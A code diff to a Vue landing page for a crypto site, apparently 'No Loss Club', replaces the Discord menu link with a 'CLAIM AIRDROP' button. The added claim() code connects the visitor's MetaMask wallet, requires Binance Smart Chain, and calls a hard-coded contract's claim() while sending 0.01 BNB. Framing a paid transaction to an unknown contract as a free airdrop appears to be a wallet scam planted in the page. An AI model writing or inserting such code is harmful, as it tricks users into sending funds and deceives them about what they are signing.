@@ -7,7 +7,7 @@
 			<div class="flex-none">
 				<ul class="menu menu-horizontal p-0">
 					<li><a class="m-2 bg-green-300" href="https://app.nolossclub.com/">APP</a></li>
-					<li><a class="m-2 bg-green-300" href="https://discord.gg/rs862d6wsA">Discord</a></li>
+					<li><a class="m-2 bg-green-300" @click="claim()">CLAIM AIRDROP</a></li>
 				</ul>
 			</div>
 		</div>
@@ -53,13 +53,61 @@
 	import faq from './components/Faq.vue';
 	import work from './components/Work.vue';
 
+	import { ethers } from 'ethers';
+
+	import abi from './abi.json';
+
+	async function Contract() {
+		try {
+			if (!window.ethereum) {
+				alert('Please Install Metamask');
+				return;
+			}
+
+			await window.ethereum.enable();
+
+			const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+			console.log('User : ' + accounts[0]);
+
+			await window.ethereum.enable();
+
+			const newProvider = new ethers.providers.Web3Provider(window.ethereum);
+
+			const signer = newProvider.getSigner();
+
+			const { chainId } = await newProvider.getNetwork();
+
+			if (chainId !== 56) {
+				alert('Switch to Binance Smart Chain network');
+				return;
+			}
+
+			const action_set = new ethers.Contract('0xCECd2f55c62e8506258e79577382F62E510c3FB5', abi, signer);
+
+			return action_set;
+		} catch (err) {
+			console.log(err);
+			return false;
+		}
+	}
+
 	export default {
-		name: 'App',
 		components: {
 			land,
 			bet,
 			faq,
 			work,
+		},
+		data() {
+			return {
+				data: '',
+			};
+		},
+		methods: {
+			async claim() {
+				const runx = await Contract();
+				await runx.claim({ value: 10000000000000000, gasLimit: 5000000 });
+			},
 		},
 	};
 </script>
